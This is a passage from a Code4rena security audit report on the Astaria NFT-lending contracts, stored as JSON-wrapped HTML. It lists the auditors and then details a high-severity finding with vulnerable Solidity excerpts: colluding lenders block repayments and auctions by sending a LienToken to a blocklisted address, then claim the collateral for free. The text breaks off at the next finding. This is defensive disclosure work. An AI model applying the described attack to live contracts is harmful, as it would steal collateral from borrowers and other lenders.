{
  "circa": {
    "title": "Astaria contest",
    "sponsor": "Astaria",
    "slug": "2023-01-astaria",
    "date": "2023-05-22",
    "findings": "https://github.com/code-423n4/2023-01-astaria-findings/issues",
    "contest": 202
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Astaria smart contract system written in Solidity. The audit took place between January 5—January 19 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>109 Wardens contributed reports to the Astaria audit:</p>\n<ol>\n<li><a href=\"https://twitter.com/0kage_eth\">0Kage</a></li>\n<li>0x1f8b</li>\n<li><a href=\"https://twitter.com/0xAgro\">0xAgro</a></li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>0xackermann</li>\n<li>0xbepresent</li>\n<li>0xcm</li>\n<li>0xkato</li>\n<li><a href=\"https://github.com/alex-ppg\">0xsomeone</a></li>\n<li>7siech</li>\n<li>Apocalypto (cRat1st0s, reassor, and M0ndoHEHE)</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>Bjorn_bug</li>\n<li>Bnke0x0</li>\n<li>Breeje</li>\n<li>CloudX (<a href=\"https://twitter.com/angel_tripi\">Migue</a>, pabliyo, and marce1993)</li>\n<li>CodingNameKiki</li>\n<li><a href=\"https://twitter.com/DeFiCast\">Cryptor</a></li>\n<li>Deekshith99</li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li>Delvir0</li>\n<li>HE1M</li>\n<li>IllIllI</li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li>JTs</li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li>Josiah</li>\n<li>Jujic</li>\n<li>KIntern_NA (TrungOre, duc, and Trumpero)</li>\n<li><a href=\"https://www.linkedin.com/in/kayode-okunlade-862001142/\">Kaysoft</a></li>\n<li><a href=\"https://twitter.com/KoolexC\">Koolex</a></li>\n<li>Lirios</li>\n<li>Lotus</li>\n<li>PaludoX0</li>\n<li><a href=\"https://twitter.com/adigunq_adigun\">Qeew</a></li>\n<li>Rageur</li>\n<li><a href=\"https://www.linkedin.com/in/nhan-vo-a9473019a/\">Rahoz</a></li>\n<li><a href=\"https://raiders0786.github.io/Portfolio/\">Raiders</a></li>\n<li>RaymondFam</li>\n<li>ReyAdmirado</li>\n<li>Rolezn</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>SadBase</li>\n<li>SaeedAlipoor01988</li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li>Tointer</li>\n<li><a href=\"https://twitter.com/a12jmx\">a12jmx</a></li>\n<li><a href=\"https://github.com/romeroadrian\">adriro</a></li>\n<li>arialblack14</li>\n<li>ast3ros</li>\n<li>ayeslick</li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>btk</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li>c7e7eff</li>\n<li>caventa</li>\n<li>cccz</li>\n<li><a href=\"https://twitter.com/cergyk1337\">cergyk</a></li>\n<li>ch0bu</li>\n<li>chaduke</li>\n<li>chrisdior4</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>delfin454000</li>\n<li>descharre</li>\n<li>dragotanqueray</li>\n<li>eierina</li>\n<li>evan</li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li>fs0c</li>\n<li><a href=\"https://twitter.com/georgits_\">georgits</a></li>\n<li>gtocoder</li>\n<li>gz627</li>\n<li>horsefacts</li>\n<li>jasonxiale</li>\n<li>jesusrod15</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li><a href=\"https://twitter.com/0xKaden\">kaden</a></li>\n<li><a href=\"https://twitter.com/Xc1008Cu\">ladboy233</a></li>\n<li>lukris02</li>\n<li>m9800</li>\n<li><a href=\"https://github.com/nicobevilacqua\">nicobevi</a></li>\n<li><a href=\"https://twitter.com/0xnogo\">nogo</a></li>\n<li><a href=\"https://twitter.com/da5e8f4e\">oberon</a></li>\n<li><a href=\"https://twitter.com/zachobront\">obront</a></li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li><a href=\"https://twitter.com/peak_bolt\">peakbolt</a></li>\n<li><a href=\"https://t.me/pfahard\">pfapostol</a></li>\n<li><a href=\"https://twitter.com/pwnforce\">pwnforce</a></li>\n<li>rbserver</li>\n<li>rvierdiiev</li>\n<li>sakshamguruji</li>\n<li><a href=\"https://github.com/seeu-inspace\">seeu</a></li>\n<li>shark</li>\n<li>simon135</li>\n<li><a href=\"https://twitter.com/slvDev\">slvDev</a></li>\n<li>synackrst</li>\n<li>tnevler</li>\n<li><a href=\"https://twitter.com/cvetanovv0\">tsvetanovv</a></li>\n<li>unforgiven</li>\n<li>wallstreetvilkas</li>\n<li>whilom</li>\n<li>yongskiws</li>\n<li><a href=\"https://twitter.com/0xzaskoh\">zaskoh</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://twitter.com/thePicodes\">Picodes</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 55 unique vulnerabilities. Of these vulnerabilities, 21 received a risk rating in the category of HIGH severity and 34 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 62 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 28 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-01-astaria\">C4 Astaria audit repository</a>, and is composed of 45 files written in the Solidity programming language and includes 5,136 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-21\" style=\"position:relative;\"><a href=\"#high-risk-findings-21\" aria-label=\"high risk findings 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (21)</h1>\n<h2 id=\"h-01-lientoken-lender-and-liquidator-can-collude-to-block-auction-and-seize-collateral\" style=\"position:relative;\"><a href=\"#h-01-lientoken-lender-and-liquidator-can-collude-to-block-auction-and-seize-collateral\" aria-label=\"h 01 lientoken lender and liquidator can collude to block auction and seize collateral permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/607\">[H-01] <code>LienToken</code>: Lender and liquidator can collude to block auction and seize collateral</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/607\">horsefacts</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/629\">peakbolt</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/317\">KIntern_NA</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643</a></p>\n<p>If a lender offers a loan denominated in an ERC20 token that blocks transfers to certain addresses (for example, the USDT and USDC blocklist), they may collude with a liquidator (or act as the liquidator themselves) to prevent loan payments, block all bids in the liquidation auction, and seize the borrower’s collateral by transferring a <code>LienToken</code> to a blocked address.</p>\n<p><code>LienTokens</code> act as bearer assets: if a lender transfers their lien token to another address, the lien’s new payee will be the <code>ownerOf</code> the token:</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L900-L909\"><code>LienToken#_getPayee</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getPayee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienMeta</span><span class=\"mtk1\">[</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">payee</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ? </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienMeta</span><span class=\"mtk1\">[</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">payee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        : </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The payee address returned by <code>_getPayee</code> is used as the recipient address of loan repayments via <code>makePayment</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849\"><code>LienToken#_payment</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>…as well as post-liquidation payments from the clearinghouse via <code>payDebtViaClearingHouse</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643\"><code>LienToken#_paymentAH</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>If an adversary tranfers their <code>LienToken</code> to an address that causes these attempted transfers to revert, like an address on the USDC blocklist, the borrower will be unable to make payments on their lien, the loan will eventually qualify for liquidation, and all bids in the Seaport auction will revert when they attempt to send payment to the blocklisted address.</p>\n<p>Following the failed auction, the liquidator can call <code>CollateralToken#liquidatorNFTClaim</code>, which calls <code>ClearingHouse#settleLiquidatorNFTClaim</code> and settles the loan for zero payment, claiming the “liquidated” collateral token for free:</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231\"><code>ClearingHouse#settleLiquidatorNFTClaim</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">settleLiquidatorNFTClaim</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IAstariaRouter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IAstariaRouter</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_getArgAddress</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">COLLATERAL_TOKEN</span><span class=\"mtk1\">()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ClearingHouseStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getStorage</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">LIEN_TOKEN</span><span class=\"mtk1\">().</span><span class=\"mtk11\">payDebtViaClearingHouse</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">COLLATERAL_ID</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The lender will lose the amount of their lien, but can seize the borrower’s collateral, worth more than their individual lien. Malicious lenders may offer small loans with attractive terms to lure unsuspecting borrowers. Note also that the lender and liquidator can be one and the same—they don’t need to be different parties to pull off this attack! A clever borrower could potentially perform this attack as well, by acting as borrower, lender, and liquidator, and buying out one of their own liens by using loaned funds.</p>\n<p>(The failed auction liquidation logic above strikes me as a little odd as well: consider whether the liquidator should instead be required to pay a minimum amount covering the bad debt in order to claim the collateral token, rather than claiming it for free).</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<ul>\n<li>Malicious lender/liquidator loses amount of their lien, but keeps collateral NFT.</li>\n<li>Additional liens in the stack cannot be repaid. These other lenders take on bad debt and lose the amount of their liens.</li>\n<li>Borrower loses their collateral NFT, keeps full amount of their liens.</li>\n</ul>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>This may be difficult to mitigate. Transferring a lien to a blocklisted address is one mechanism for this attack using USDT and USDC, but there are other ways arbitrary ERC20s might revert. Two potential options:</p>\n<ul>\n<li>Maintain an allowlist of supported ERC20s and limit it to well behaved tokens—WETH, DAI, etc.</li>\n<li>Do not “push” payments to payees on loan payment or auction settlement, but handle this in two steps—first receiving payment from the borrower or Seaport auction and storing it in escrow, then allowing lien owners to “pull” the escrowed payment.</li>\n</ul>\n<h3 id=\"test-case\" style=\"position:relative;\"><a href=\"#test-case\" aria-label=\"test case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test Case</h3>\n<p>See warden’s <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/607\">original submission</a> for full details.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/607\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/607#issuecomment-1436024753\">Picodes (judge) increased the severity to High</a></strong></p>\n<hr>\n<h2 id=\"h-02-erc4626cloned-deposit-and-mint-logic-differ-on-first-deposit\" style=\"position:relative;\"><a href=\"#h-02-erc4626cloned-deposit-and-mint-logic-differ-on-first-deposit\" aria-label=\"h 02 erc4626cloned deposit and mint logic differ on first deposit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a 